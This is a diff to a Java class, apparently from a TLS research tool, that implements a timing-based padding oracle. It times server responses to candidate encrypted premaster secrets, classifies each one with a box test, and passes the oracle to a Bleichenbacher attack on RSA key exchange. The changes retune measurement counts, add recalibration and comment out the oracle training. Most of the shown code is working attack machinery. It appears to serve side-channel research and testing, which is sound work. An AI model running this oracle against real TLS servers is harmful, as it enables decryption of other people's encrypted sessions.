@@ -134,27 +134,35 @@ public class TimingOracle extends ATimingOracle {
     private String protocolShortName = "TLS";
     
     /**
-     * Amount of training measurements
+     * Amount of training measurementsTest
      */
     private static final int trainingAmount = 200;
     
     /**
-     * Amount of measurements per Oracle query
+     * Amount of measurementsTest per Oracle query
      */
-    private static final int measurementAmount = 50;
+    private static final int measurementAmount = 15;
+    private static final int measurementFactorForValidation = 5;
     
     /**
-     * Amount of warmup measurements
+     * Amount of warmup measurementsTest
      */
-    private static final int warmupAmount = 1000;
+    private static final int warmupAmount = 100;
+    
+    /**
+     * Timing difference between invalid and valid timings
+     */
+    private static final long validInvalidBoundary = 30000;
     
     
     private int boxLowPercentile = 10,
-            boxHighPercentile = 15;
+            boxHighPercentile = 10;
+        
+    private int counterOracle = 0;
+    private int counterRequest = 0;
     
-    private long invalidKeyLow;
     
-    private int counter = 0;
+    long[] measurementsValid = new long[measurementAmount * measurementFactorForValidation];
     
     ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
     ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
@@ -181,39 +189,81 @@ public class TimingOracle extends ATimingOracle {
         cipher = Cipher.getInstance("RSA/None/NoPadding");
         cipher.init(Cipher.DECRYPT_MODE, privateKey);
     }
+    
+    private boolean isValidPMS(byte[] testPMS) {
+        boolean result;
+        
+        counterRequest++;
+        
+        if(counterRequest < 10 || counterRequest % 10 == 0) {
+            result = isValidPMS(testPMS, measurementAmount, true);
+        } else {
+            result = isValidPMS(testPMS, measurementAmount, false);
+        }
+        
+        if(result == true) {
+            System.out.println("Found a candidate for a valid key. Checking again with more measurements.");
+            result = isValidPMS(testPMS, measurementAmount * measurementFactorForValidation, true);
+        }
+        
+        return result;
+    }
 
     /**
-     * This method performs the statistical analysis of the timing measurements.
+     * This method performs the statistical analysis of the timing measurementsTest.
      * It assumes that a valid key has a significantly lower response time than
      * an invalid key. In a nutshell, the method performs Crosby's box test.
      *
-     * @param testKey An array containing the list of measurements that were
+     * @param testKey An array containing the list of measurementsTest that were
      * performed with the key to be tested
-     * @param validKey An array containing the list of measurements that were
+     * @param validKey An array containing the list of measurementsTest that were
      * performed with a known-to-be-valid key
      * @return true if testKey is significantly different from invalidKey and thus valid.
      */
-    private boolean isValidPMS(byte[] encPMS) {
-        long[] measurements = new long[measurementAmount];
-        for (int i = 0; i < measurementAmount; i++) {
+    private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements, boolean recalibrate) {
+    
+        long[] measurementsTest = new long[amountOfMeasurements];
+        
+        if(recalibrate) {
+            measurementsValid = new long[amountOfMeasurements * 2];
+        }
+        
+        int j = 0;
+        for (int i = 0; i < amountOfMeasurements; i++) {
             try {
-                exectuteWorkflow(encPMS);
-                measurements[i] = getTimeDelay(getWorkflow().getTraceList());
+                exectuteWorkflow(testPMS);
+                measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());
+                
+                if(recalibrate) {
+                    exectuteWorkflow(encPMS);
+                    measurementsValid[j++] = getTimeDelay(getWorkflow().getTraceList());
+                    exectuteWorkflow(encPMS);
+                    measurementsValid[j++] = getTimeDelay(getWorkflow().getTraceList());
+                }
+                
             } catch (OracleException ex) {
                 java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
             }
         }
 
-        Arrays.sort(measurements);
+        Arrays.sort(measurementsTest);
+        if(recalibrate) {
+            Arrays.sort(measurementsValid);
+        }
         
-        int pos = measurements.length * boxHighPercentile / 100;
+        int posLow  = measurementsTest.length  * boxLowPercentile  / 100;
+        int posHigh = measurementsValid.length * boxHighPercentile / 100;
 
-        long testKeyHigh = measurements[pos];
+        /*
+         * If the filtered difference between these two measurements is smaller
+         * than the validInvalidBoundary, then the key is valid (--> true).
+         */
+        boolean result = (measurementsTest[posLow] - measurementsValid[posHigh]) < validInvalidBoundary;
         
         
-        System.out.println("isValid: " + Arrays.toString(measurements) + "; " + pos + "; " + testKeyHigh);
+        System.out.println("ZZZ " + measurementsTest[posLow] + " - " + measurementsValid[posHigh] + " = " + (measurementsTest[posLow] - measurementsValid[posHigh]) + ", " + result);
 
-        return invalidKeyLow > testKeyHigh;
+        return result;
     }
 
     @Override
@@ -229,43 +279,43 @@ public class TimingOracle extends ATimingOracle {
         System.out.println("done!");
         
       
-        try {
-            long delay;
-            // train the oracle using the executeWorkflow functionality
-            for (int i = 0; i < trainingAmount; i++) {
-                exectuteWorkflow(validRequest);
-                delay = getTimeDelay(getWorkflow().getTraceList());
-                validTimings.add(delay);
-
-                exectuteWorkflow(invalidRequest);
-                delay = getTimeDelay(getWorkflow().getTraceList());
-                invalidTimings.add(delay);
-
-                System.out.print("\r left requests for training " + (trainingAmount - i));
-            }
-            System.out.println("\n");
-            FileWriter fw = new FileWriter("training_data.csv");
-            for(int i = 0; i < trainingAmount; i++) {
-                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
-                fw.write((i + trainingAmount) + ";valid;" + validTimings.get(i) + "\n");
-            }
-            fw.close();
-            
-            long[] temp = new long[trainingAmount];
-            for(int i = 0; i < trainingAmount; i++) {
-                temp[i] = invalidTimings.get(i);
-            }
-            Arrays.sort(temp);
-            int pos = (trainingAmount * boxLowPercentile) / 100;
-            
-            invalidKeyLow = temp[pos];
-            
-            System.out.println("TRAINING: " + Arrays.toString(temp) + "; " + pos + "; " + invalidKeyLow);
-            
-            
-        } catch (IOException ex) {
-            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
-        }
+//        try {
+//            long delay;
+//            // train the oracle using the executeWorkflow functionality
+//            for (int i = 0; i < trainingAmount; i++) {
+//                exectuteWorkflow(validRequest);
+//                delay = getTimeDelay(getWorkflow().getTraceList());
+//                validTimings.add(delay);
+//
+//                exectuteWorkflow(invalidRequest);
+//                delay = getTimeDelay(getWorkflow().getTraceList());
+//                invalidTimings.add(delay);
+//
+//                System.out.print("\r left requests for training " + (trainingAmount - i));
+//            }
+//            System.out.println("\n");
+//            FileWriter fw = new FileWriter("training_data.csv");
+//            for(int i = 0; i < trainingAmount; i++) {
+//                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
+//                fw.write((i + trainingAmount) + ";valid;" + validTimings.get(i) + "\n");
+//            }
+//            fw.close();
+//            
+//            long[] temp = new long[trainingAmount];
+//            for(int i = 0; i < trainingAmount; i++) {
+//                temp[i] = invalidTimings.get(i);
+//            }
+//            Arrays.sort(temp);
+//            int pos = (trainingAmount * boxLowPercentile) / 100;
+//            
+//            invalidKeyLow = temp[pos];
+//            
+//            System.out.println("TRAINING: " + Arrays.toString(temp) + "; " + pos + "; " + invalidKeyLow);
+//            
+//            
+//        } catch (IOException ex) {
+//            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
+//        }
         
 //        Conf.put("inputFile", "training_data.csv");
 //        Conf.put("gnuplot", "/usr/bin/gnuplot");
@@ -296,10 +346,10 @@ public class TimingOracle extends ATimingOracle {
 //         userInputOptimalBox[1] = new Double(0.21);
 //         statisticEvaluation.setOptimalBox(userInputOptimalBox);*/
 //
-//        // Manually set the minimum amount of measurements
+//        // Manually set the minimum amount of measurementsTest
 //        // statisticEvaluation.onlyValidationPhase(1000);
 //
-//        // Automatically determine minimum amount of measurements
+//        // Automatically determine minimum amount of measurementsTest
 //        statisticEvaluation.calibrationPhase();
 //
 //        // print the box test results into a csv file
@@ -313,7 +363,7 @@ public class TimingOracle extends ATimingOracle {
 //
 //         // iterate above all tested smallest sizes
 //         for(int i = 0; i < result.getSmallestSize().size(); ++i) {
-//         System.out.println("Minimum amouont of measurements: " + result.getSmallestSize().get(i) + "\nConfidence Interval: " + result.getConfidenceInterval().get(i));
+//         System.out.println("Minimum amouont of measurementsTest: " + result.getSmallestSize().get(i) + "\nConfidence Interval: " + result.getConfidenceInterval().get(i));
 //         System.out.println("Subset A overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapA().get(i)));
 //         System.out.println("Subset B overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapB().get(i)));
 //         System.out.println("Subset A and B significant different: " + Folder.convertArrayListToString(result.getSignificantDifferent().get(i)));
@@ -407,8 +457,6 @@ public class TimingOracle extends ATimingOracle {
         boolean ret = false;
         boolean groundTruth = false;
         
-        encPMS = this.encPMS;
-        
         try {
             groundTruth = cheat(encPMS);
             boolean test = isValidPMS(encPMS);
@@ -454,7 +502,7 @@ public class TimingOracle extends ATimingOracle {
             java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
         }
         
-        System.out.println(counter++ + ": Ground truth: " + groundTruth + ", timingoracle: " + ret);
+        System.out.println(counterOracle++ + ": Ground truth: " + groundTruth + ", timingoracle: " + ret);
         
         return ret;
     }
@@ -505,9 +553,8 @@ public class TimingOracle extends ATimingOracle {
             to.encPMSWrong = encPMSWrong;
 
             to.trainOracle(encPMS, encPMSWrong);
-            to.plausibilityCheck();
-            // System.exit(0);
-
+            // to.plausibilityCheck();
+   
             Bleichenbacher attacker = new Bleichenbacher(encPMS,
                     to, true);
             attacker.attack();
